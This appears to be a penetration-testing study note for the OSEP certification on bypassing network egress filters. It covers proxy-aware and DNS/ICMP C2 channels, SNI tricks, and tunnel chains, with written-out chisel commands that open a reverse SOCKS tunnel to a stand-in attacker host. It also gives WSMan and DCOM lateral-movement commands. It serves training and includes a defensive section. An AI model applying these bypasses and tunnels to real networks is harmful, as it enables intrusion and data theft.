---
title: OSEP network filter bypass techniques
slug: osep-network-filter-bypass-techniques
aliases: [osep-network-bypass, pen300-network-filter-bypass]
---

> **TL;DR:** OSEP-style assessments routinely drop you on a workstation with no direct internet, an authenticated proxy, an IP allowlist, or a TLS inspector in the middle. Getting a beacon out and lateral movement working under those constraints is the whole game. This note catalogues the network-filter bypass patterns OSEP candidates should rehearse end-to-end: enumerating egress, abusing the corporate proxy, falling back to DNS or ICMP channels, chaining tunnels through [[chisel]] / [[ligolo-ng]] / SSH, web-shell pivoting, and lateral movement when SMB is blocked. Companion to [[osep-exam-strategy-and-pacing]], [[osep-payload-development-toolkit]], [[modern-tunnelling-chains-chisel-ligolo-gost]], [[dns-c2-and-icmp-c2]], and [[pivoting-and-tunneling]].

## Why it matters

OSEP's network-filter problems are deliberately realistic. Real corporate networks rarely give you free outbound 443. You will face some mix of:

- A forced HTTP CONNECT proxy with NTLM or Kerberos auth.
- An egress allowlist of CDN / SaaS domains (Microsoft, Akamai, Cloudflare).
- TLS inspection with a corporate CA in the trust store.
- Internal-only segments with no egress at all.
- East-west firewalls blocking SMB / WinRM between user VLANs.

Failing to plan for these costs hours. The exam window punishes operators who only know "run the implant and pray." OSEP wants you to demonstrate that you can enumerate the filter, pick the cheapest channel that works, and chain pivots when the first beacon lands on a dead-end host. See [[osep-exam-strategy-and-pacing]] for time budgeting around these decisions.

## Egress enumeration first

Before you pick a bypass, characterise what is actually filtered. Do this from the foothold itself, not from your attacker box.

### Quick probes

- Resolve external names: `nslookup example.com` and `Resolve-DnsName -Type A` to confirm DNS works at all and which resolver answers.
- Test raw outbound: PowerShell `Test-NetConnection -ComputerName 1.1.1.1 -Port 443` across 80 / 443 / 53 / 8080 / 3128.
- Detect proxy: read `HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings` (`ProxyEnable`, `ProxyServer`, `AutoConfigURL`). Pull and parse the PAC file.
- TLS inspection: fetch a known cert (e.g. against an attacker-controlled host) and compare issuer to the system trust store. A corporate CA on a wildcard cert means MITM.
- Allowlist hints: many environments allow `*.windowsupdate.com`, `*.azureedge.net`, `*.cloudfront.net`, `*.sharepoint.com`. Test reachability.

Document the matrix (direct vs proxy, allowed ports, DNS scope, ICMP) before you burn implants on bad channels.

## Pattern 1: outbound restrictions

### Proxy-only egress

If `WinHTTP` / `WinINET` are routed through a proxy:

- Use HTTP / HTTPS C2 that natively honours `WinHTTP` proxy settings (Sliver, Havoc, Cobalt Strike's HTTPS listener). See [[sliver-c2-deep]] and [[havoc-c2-deep]].
- For NTLM-auth proxies, your implant must reuse the user token. Token-aware HTTP clients in .NET (`WebClient` with `UseDefaultCredentials = true`) and `WinHTTP` with `WINHTTP_AUTOLOGON_SECURITY_LEVEL_LOW` work.
- For Kerberos-auth proxies, you need the current session token; SYSTEM beacons fail until you steal a user token (see [[process-injection-techniques]] for token duplication patterns).

### IP allowlist

When only a handful of destination IPs / CIDRs are reachable, point your redirector at a CDN-fronted domain inside the allowlist. Modern redirector designs are covered in [[phishing-infrastructure-design]] and [[payload-staging]]. Avoid raw VPS IPs entirely.

### Port restriction

If only 80 / 443 are open, drop attempts on 4444, 8080, 53 to a fallback channel rather than retrying. Multi-channel beacons (HTTPS primary, DNS secondary) survive port-block changes during the engagement.

## Pattern 2: DNS as exfil / C2

When everything else is filtered but the internal resolver forwards externally, DNS C2 buys you a slow but reliable channel. Sliver, Cobalt Strike, dnscat2, and Mythic's `dnsstager` all implement TXT / A / AAAA tunnels. Details in [[dns-c2-and-icmp-c2]].

Operator notes:

- Throughput is single-digit kilobytes per second. Use for staging keying material and small command output; switch to HTTPS through a SOCKS pivot for bulk transfer.
- Stick to long TTL randomised subdomains. Modern detection flags high-entropy subdomain patterns ([[detection-engineering-pyramid-of-pain]]).
- Register two domains: one for the heartbeat, one for data. Detection of one does not kill the channel immediately.

## Pattern 3: ICMP fallback

ICMP echo data is filtered in many environments but not all internal segments. `icmpsh`, `icmp-tunnel` from Sliver, and custom raw-socket implants can carry a low-bandwidth channel out when DNS dies. Treat ICMP as a last-resort emergency channel, not a primary. See [[dns-c2-and-icmp-c2]] for trade-offs.

## Pattern 4: SNI manipulation

TLS inspectors that decide on SNI before terminating can be confused by:

- Splitting the ClientHello across TCP segments so the SNI lands in the second packet.
- Sending a SNI for an allowed domain while pointing the HTTP `Host` header at your real C2 (works only on misconfigured inspectors).
- Using ESNI / Encrypted Client Hello where the inspector does not support the extension.

These tricks are fragile and increasingly detected. Test in a lab first; do not burn a foothold proving a theory.

## Pattern 5: domain fronting (mostly deprecated)

Domain fronting routed an HTTPS request to an allowed CDN domain via SNI / Host, then internally re-routed to your attacker domain. AWS CloudFront, Azure Front Door, Google App Engine, and Fastly have all blocked the technique. A handful of smaller CDNs still permit it; assume any production target has it disabled. Mentioned here so you recognise the pattern in older write-ups, not as a primary bypass.

## Pattern 6: HTTPS over an authenticated proxy

The most common OSEP scenario: a CONNECT proxy with NTLM auth. Workflow:

1. Read proxy settings or PAC file.
2. Build a HTTP C2 profile that issues `CONNECT host:443 HTTP/1.1` followed by `Proxy-Authorization: NTLM ...`.
3. If the implant runs as the interactive user, libraries like `System.Net.WebClient` with default creds will auto-negotiate.
4. For SYSTEM contexts, either downgrade to user token or use `make_token` / `runas /netonly` style tricks to attach valid creds.
5. Validate with a manual `curl --proxy http://proxy:8080 --proxy-ntlm -U domain\\user:pass https://attacker-controlled/`.

For tunnelling tooling that already speaks proxy CONNECT see [[chisel]], [[ligolo-ng]], and `gost`. See [[modern-tunnelling-chains-chisel-ligolo-gost]] for the comparison.

## Pattern 7: double-tunnel chain

When the foothold reaches a proxy but lateral targets are deeper, chain channels:

```
attacker  <-- HTTPS/443 -- corporate proxy -- foothost -- SOCKS5 -- internal-pivot -- SSH -- target
```

Concrete recipe with [[chisel]]:

1. On attacker: `chisel server -p 443 --reverse --tls-domain redirector.example.com`.
2. On foothost (through the corporate proxy): `chisel client https://redirector.example.com:443 R:1080:socks` with `HTTPS_PROXY=https://proxy:8080`.
3. Attacker-side `proxychains` now resolves through the foothost's SOCKS5.
4. Through that SOCKS, SSH into an internal Linux pivot and open a second reverse SOCKS for the next zone.

Document the chain on paper before you build it; one mis-ordered hop wastes 20 minutes.

## Pattern 8: SOCKS5 reverse via Sliver / chisel / ligolo-ng

OSEP-relevant tools and when to pick each:

- [[chisel]]: best when you already have HTTPS egress and want a single static binary. Performs well over CONNECT proxies.
- [[ligolo-ng]]: TUN-based, behaves like a real route on the operator side, supports Windows agents. Best when you need every tool to "just work" without `proxychains`.
- Sliver's built-in `socks5`: fine for opportunistic pivots but slower than chisel for bulk transfer ([[sliver-c2-deep]]).

For exam pacing, pre-stage all three so you can switch when one is detected. See [[modern-tunnelling-chains-chisel-ligolo-gost]] for tuning notes.

## Pattern 9: web-shell tunnelling for staging

When the foothold is a web app and there is no direct egress at all, push a tunnel through the web shell itself:

- `reGeorg`, `pivotnacci`, and `Neo-reGeorg` tunnel SOCKS through HTTP POST bodies to an ASPX / JSP / PHP shell.
- Use only for staging a heavier implant; throughput is poor and detection is easy.
- Once a richer beacon is on disk, drop the web-shell tunnel.

See [[pivoting-and-tunneling]] for the broader catalogue.

## Pattern 10: PowerShell remoting over WSMan (5985 / 5986)

When SMB (445) is blocked east-west but WSMan is allowed:

- `Enter-PSSession -ComputerName target -Authentication Kerberos` over 5985 / 5986.
- Token delegation works if `Enable-WSManCredSSP` was set; check before relying on double-hop.
- `Invoke-Command` is ideal for executing in-memory loaders on the target without dropping files.
- Combine with [[constrained-delegation]] / [[resource-based-constrained-delegation]] for token reuse across hops.

## Pattern 11: COM / DCOM lateral with no SMB

When 445 and 5985 are both blocked, DCOM lateral movement over 135 + ephemeral RPC ports may still work:

- `MMC20.Application`, `ShellWindows`, `ShellBrowserWindow`, `Excel.Application` are the classic OSEP-friendly objects.
- Trigger via `[Activator]::CreateInstance([Type]::GetTypeFromProgID('MMC20.Application', 'target'))`.
- Output goes nowhere by default; pair with a follow-up reverse beacon over the SOCKS pivot.

Hardening notes live in [[com-hijacking]] and broader process control in [[process-injection-techniques]].

## Pattern 12: certificate-pinned C2 callback

When TLS inspection rewrites certs with the corporate CA, plain HTTPS implants still work because the corporate CA is trusted. But if you need to detect inspection or refuse to talk to the inspector, pin the expected leaf or issuer in the implant:

- Sliver and Havoc support per-listener pinned fingerprints.
- On mismatch, switch profile to DNS or ICMP rather than hand cleartext beacon traffic to the inspector.
- Useful when the inspector is logging cleartext to a SIEM monitored by the blue team.

## Defensive baseline

For the defenders reading along:

- Force all egress through an authenticated proxy with TLS inspection and a deny-by-default destination allowlist.
- Alert on outbound DNS to high-entropy subdomains, on ICMP with data lengths uncommon for the OS, on `chisel` / `ligolo` binary hashes, and on PowerShell `WSMan` use from non-admin workstations.
- Block east-west SMB and WinRM between user VLANs; allow only from jump hosts.
- Pin internal CA on critical services so cleartext exfil through corporate inspection is still detected on the wire.
- Map these controls back to [[detection-engineering-pyramid-of-pain]] tiers; SNI tricks and tunnelling binaries live at TTP level, not hash level.

## Workflow to study

1. Build a lab: pfSense or OPNsense doing egress filtering, Squid with NTLM auth, an internal Windows network with WinRM disabled between two VLANs.
2. Drop a foothold and time yourself enumerating the proxy and PAC config.
3. Stand up Sliver / Havoc HTTPS through the proxy with user-token auth.
4. Add a DNS C2 fallback and switch channels live.
5. Stand a chisel SOCKS5 reverse tunnel through the same proxy.
6. From the SOCKS, pivot via WSMan, then via DCOM, capturing pcap each time.
7. Replay against [[ligolo-ng]] to compare ergonomics.
8. Practice the full chain inside the OSEP-style time budget from [[osep-exam-strategy-and-pacing]].

## Related

- [[osep-exam-strategy-and-pacing]]
- [[osep-payload-development-toolkit]]
- [[osep-roadmap]]
- [[modern-tunnelling-chains-chisel-ligolo-gost]]
- [[dns-c2-and-icmp-c2]]
- [[chisel]]
- [[ligolo-ng]]
- [[ssh-tunneling]]
- [[port-forwarding]]
- [[pivoting-and-tunneling]]
- [[sliver-c2-deep]]
- [[havoc-c2-deep]]
- [[c2-frameworks]]
- [[phishing-infrastructure-design]]
- [[payload-staging]]
- [[com-hijacking]]
- [[constrained-delegation]]
- [[resource-based-constrained-delegation]]
- [[detection-engineering-pyramid-of-pain]]

## References

- <https://www.offsec.com/courses/pen-300/> — OSEP / PEN-300 syllabus.
- <https://github.com/jpillora/chisel> — chisel reverse tunnel.
- <https://github.com/nicocha30/ligolo-ng> — ligolo-ng TUN pivot.
- <https://github.com/iagox86/dnscat2> — DNS tunnel reference implementation.
- <https://learn.microsoft.com/en-us/windows/win32/winrm/portals> — WinRM / WSMan port and auth reference.
- <https://attack.mitre.org/techniques/T1090/> — MITRE ATT&CK proxy / tunnelling sub-techniques.
